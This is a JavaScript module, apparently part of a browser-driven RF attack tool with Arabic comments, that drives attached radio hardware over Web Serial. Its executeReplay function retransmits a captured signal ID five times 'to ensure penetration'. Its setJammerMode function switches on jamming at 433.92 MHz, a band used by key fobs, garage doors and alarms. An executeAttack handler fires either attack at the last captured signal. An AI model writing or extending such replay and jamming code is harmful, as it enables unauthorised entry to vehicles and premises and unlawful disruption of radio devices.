/* STARK RF TRANSMITTER v4.5 - TACTICAL PAYLOAD ENGINE */

const Transmitter = {
    isTransmitting: false,
    queue: [],

    // 1. نظام إرسال النبضات المتطور (Replay & Injection)
    executeReplay: async function(hexID, pulseWidth) {
        if (!hexID || hexID === "null") {
            logToTerminal("STRIKE_CANCELLED: NO_VALID_TARGET_ID", "error");
            return;
        }

        // تحضير الـ Payload العسكري
        const payload = `TX_REQ:${hexID}:${pulseWidth}:5\n`; // الرقم 5 يعني كرر الإرسال 5 مرات لضمان الاختراق
        this.addToQueue(payload, `REPLAY_STRIKE_ID_${hexID}`);
    },

    // 2. نظام التشويش النبضي (Deceptive Jamming)
    setJammerMode: async function(active) {
        const mode = active ? "JAM_PROC:ON:433.92\n" : "JAM_PROC:OFF\n";
        this.addToQueue(mode, active ? "JAMMER_ARMED" : "JAMMER_DISARMED");

        // تحديث HUD الواجهة
        const statusElement = document.getElementById('conn-status');
        if (active) {
            statusElement.innerText = "JAMMING_IN_PROGRESS";
            statusElement.classList.add('danger-glow'); // تأثير CSS للموجات الحمراء
        } else {
            statusElement.innerText = "SYSTEM_READY";
            statusElement.classList.remove('danger-glow');
        }
    },

    // 3. مدير الطابور (The Dispatcher)
    addToQueue: function(command, label) {
        this.queue.push({ command, label });
        if (!this.isTransmitting) {
            this.processQueue();
        }
    },

    async processQueue() {
        if (this.queue.length === 0) {
            this.isTransmitting = false;
            return;
        }

        this.isTransmitting = true;
        const task = this.queue.shift();

        try {
            await this.rawTransmit(task.command);
            logToTerminal(`COMMAND_EXECUTED: ${task.label}`, "success");
        } catch (err) {
            logToTerminal(`TRANSMISSION_ERROR: ${err}`, "error");
        }

        // فاصل زمني بسيط بين النبضات لمنع تداخل الترددات
        setTimeout(() => this.processQueue(), 100);
    },

    // 4. المحرك الخام للإرسال (The Driver)
    rawTransmit: async function(data) {
        if (!STARK_SYSTEM.port || !STARK_SYSTEM.port.writable) {
            throw new Error("HARDWARE_OFFLINE");
        }

        const encoder = new TextEncoder();
        const writer = STARK_SYSTEM.port.writable.getWriter();
        
        try {
            await writer.write(encoder.encode(data));
        } finally {
            writer.releaseLock();
        }
    }
};

// 5. واجهة التحكم في الهجوم (Global Attack Handler)
function executeAttack(type) {
    // التأكد من أن النظام مربوط ببيانات الـ core.js
    const targetHex = STARK_SYSTEM.lastSignal.hex;
    const targetPulse = STARK_SYSTEM.lastSignal.pulse;

    switch(type) {
        case 'REPLAY':
            Transmitter.executeReplay(targetHex, targetPulse);
            break;
        case 'JAM':
            window.isJamming = !window.isJamming;
            Transmitter.setJammerMode(window.isJamming);
            break;
    }
}
